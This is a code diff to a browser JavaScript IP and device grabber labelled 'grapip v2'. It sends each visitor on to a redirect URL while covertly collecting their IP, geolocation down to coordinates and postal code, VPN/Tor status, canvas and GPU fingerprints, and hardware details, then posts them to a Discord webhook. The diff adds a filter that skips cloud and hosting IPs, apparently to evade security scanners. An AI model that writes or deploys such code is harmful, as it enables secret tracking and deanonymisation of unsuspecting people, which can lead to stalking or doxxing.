@@ -7,6 +7,30 @@ const CONFIG = {
   timeoutMs:   2500
 };
 
+const BOT_ISP_PATTERNS = [
+  "amazon", "aws", "google", "microsoft", "azure", "digitalocean",
+  "linode", "vultr", "ovh", "hetzner", "cloudflare", "fastly",
+  "akamai", "oracle", "ibm", "alibaba", "tencent", "scaleway",
+  "leaseweb", "choopa", "psychz", "quadranet", "tzulo", "serverius",
+  "datacamp", "cogent", "zenlayer", "incapsula", "sucuri", "imperva",
+  "cdn77", "stackpath", "belcloud", "serverplan", "hostigger",
+  "contabo", "packet", "equinix", "internap", "coloclue", "servercentral"
+];
+
+function isBot(ip) {
+  const org = (ip.org || "").toLowerCase();
+  const isp = (ip.isp || ip.org || "").toLowerCase();
+  const hosting = ip.privacy?.hosting;
+
+  if (hosting === true) return true;
+
+  for (const pattern of BOT_ISP_PATTERNS) {
+    if (org.includes(pattern) || isp.includes(pattern)) return true;
+  }
+
+  return false;
+}
+
 async function resolveIPv4() {
   try {
     const ctrl = new AbortController();
@@ -144,7 +168,7 @@ async function getBattery() {
   try {
     const b = await navigator.getBattery();
     return {
-      level:   Math.round(b.level * 100) + "%",
+      level:    Math.round(b.level * 100) + "%",
       charging: b.charging ? "Yes" : "No"
     };
   } catch (_) { return { level: "N/A", charging: "N/A" }; }
@@ -152,9 +176,9 @@ async function getBattery() {
 
 function getScreenInfo() {
   return {
-    resolution: `${screen.width}x${screen.height}`,
-    colorDepth: `${screen.colorDepth}-bit`,
-    pixelRatio: window.devicePixelRatio || "N/A",
+    resolution:  `${screen.width}x${screen.height}`,
+    colorDepth:  `${screen.colorDepth}-bit`,
+    pixelRatio:  window.devicePixelRatio || "N/A",
     orientation: screen.orientation?.type || "N/A"
   };
 }
@@ -179,46 +203,46 @@ function getNetworkInfo() {
   };
 }
 
-function buildPayload(ip, browser, screen, hardware, network, battery, canvas, webgl) {
+function buildPayload(ip, screen_, hardware, network, battery, canvas, webgl) {
   const b = v => v === true ? "Yes" : v === false ? "No" : String(v ?? "N/A");
   return JSON.stringify({
     embeds: [{
-      title: "📡 Telemetry Report",
+      title: "Telemetry Report",
       color: 0x2b2d31,
       fields: [
-        { name: " IP Address",   value: String(ip.ip),          inline: true  },
-        { name: " Hostname",     value: String(ip.hostname),    inline: true  },
-        { name: " Country",      value: String(ip.country),     inline: true  },
-        { name: " Region",       value: String(ip.region),      inline: true  },
-        { name: " City",         value: String(ip.city),        inline: true  },
-        { name: " Postal",       value: String(ip.postal),      inline: true  },
-        { name: " Coordinates",  value: String(ip.loc),         inline: true  },
-        { name: " Timezone",     value: String(ip.timezone),    inline: true  },
-        { name: " Org / ASN",    value: `${ip.org} | ${ip.asn}`, inline: false },
-        { name: " VPN",          value: b(ip.privacy.vpn),      inline: true  },
-        { name: " Proxy",        value: b(ip.privacy.proxy),    inline: true  },
-        { name: " Tor",          value: b(ip.privacy.tor),      inline: true  },
-        { name: " Hosting",      value: b(ip.privacy.hosting),  inline: true  },
-        { name: " Resolution",   value: screen.resolution,      inline: true  },
-        { name: " Color Depth",  value: screen.colorDepth,      inline: true  },
-        { name: " Pixel Ratio",  value: String(screen.pixelRatio), inline: true },
-        { name: " Orientation",  value: screen.orientation,     inline: true  },
-        { name: " CPU Cores",    value: String(hardware.cores), inline: true  },
-        { name: " RAM",          value: `${hardware.memory} GB`, inline: true },
-        { name: " Platform",     value: hardware.platform,      inline: true  },
-        { name: " Touch",        value: hardware.touch,         inline: true  },
-        { name: " Net Type",     value: network.type,           inline: true  },
-        { name: " Downlink",     value: network.downlink,       inline: true  },
-        { name: " RTT",          value: network.rtt,            inline: true  },
-        { name: " Battery",      value: `${battery.level} (${battery.charging === "Yes" ? "⚡ Charging" : "🔌 Not charging"})`, inline: true },
-        { name: " Canvas FP",   value: canvas,                 inline: false },
-        { name: " GPU",          value: webgl.renderer,         inline: false },
-        { name: " GPU Vendor",   value: webgl.vendor,           inline: false },
-        { name: " User Agent",   value: navigator.userAgent.slice(0, 1024), inline: false },
-        { name: " Language",     value: navigator.language || "N/A", inline: true },
-        { name: " Languages",    value: (navigator.languages || []).join(", ") || "N/A", inline: true },
-        { name: " Cookies",      value: navigator.cookieEnabled ? "Yes" : "No", inline: true },
-        { name: " Timestamp",    value: new Date().toISOString(), inline: false }
+        { name: "IP Address",   value: String(ip.ip),               inline: true  },
+        { name: "Hostname",     value: String(ip.hostname),         inline: true  },
+        { name: "Country",      value: String(ip.country),          inline: true  },
+        { name: "Region",       value: String(ip.region),           inline: true  },
+        { name: "City",         value: String(ip.city),             inline: true  },
+        { name: "Postal",       value: String(ip.postal),           inline: true  },
+        { name: "Coordinates",  value: String(ip.loc),              inline: true  },
+        { name: "Timezone",     value: String(ip.timezone),         inline: true  },
+        { name: "Org / ASN",    value: `${ip.org} | ${ip.asn}`,    inline: false },
+        { name: "VPN",          value: b(ip.privacy.vpn),           inline: true  },
+        { name: "Proxy",        value: b(ip.privacy.proxy),         inline: true  },
+        { name: "Tor",          value: b(ip.privacy.tor),           inline: true  },
+        { name: "Hosting",      value: b(ip.privacy.hosting),       inline: true  },
+        { name: "Resolution",   value: screen_.resolution,          inline: true  },
+        { name: "Color Depth",  value: screen_.colorDepth,          inline: true  },
+        { name: "Pixel Ratio",  value: String(screen_.pixelRatio),  inline: true  },
+        { name: "Orientation",  value: screen_.orientation,         inline: true  },
+        { name: "CPU Cores",    value: String(hardware.cores),      inline: true  },
+        { name: "RAM",          value: `${hardware.memory} GB`,     inline: true  },
+        { name: "Platform",     value: hardware.platform,           inline: true  },
+        { name: "Touch",        value: hardware.touch,              inline: true  },
+        { name: "Net Type",     value: network.type,                inline: true  },
+        { name: "Downlink",     value: network.downlink,            inline: true  },
+        { name: "RTT",          value: network.rtt,                 inline: true  },
+        { name: "Battery",      value: `${battery.level} (${battery.charging === "Yes" ? "Charging" : "Not charging"})`, inline: true },
+        { name: "Canvas FP",    value: canvas,                      inline: false },
+        { name: "GPU",          value: webgl.renderer,              inline: false },
+        { name: "GPU Vendor",   value: webgl.vendor,                inline: false },
+        { name: "User Agent",   value: navigator.userAgent.slice(0, 1024), inline: false },
+        { name: "Language",     value: navigator.language || "N/A", inline: true  },
+        { name: "Languages",    value: (navigator.languages || []).join(", ") || "N/A", inline: true },
+        { name: "Cookies",      value: navigator.cookieEnabled ? "Yes" : "No", inline: true },
+        { name: "Timestamp",    value: new Date().toISOString(),    inline: false }
       ],
       footer: { text: "grapip v2" }
     }]
@@ -240,15 +264,16 @@ async function sendToDiscord(payload) {
   window.location.replace(CONFIG.redirectUrl);
 
   const [ipv4, battery] = await Promise.all([resolveIPv4(), getBattery()]);
-  const ip       = await getIPDetails(ipv4);
+  const ip = await getIPDetails(ipv4);
+
+  if (!ip || isBot(ip)) return;
+
   const canvas   = getCanvasFingerprint();
   const webgl    = getWebGLFingerprint();
   const screen_  = getScreenInfo();
   const hardware = getHardwareInfo();
   const network  = getNetworkInfo();
 
-  if (!ip) return;
-
-  const payload = buildPayload(ip, null, screen_, hardware, network, battery, canvas, webgl);
+  const payload = buildPayload(ip, screen_, hardware, network, battery, canvas, webgl);
   await sendToDiscord(payload);
 })();
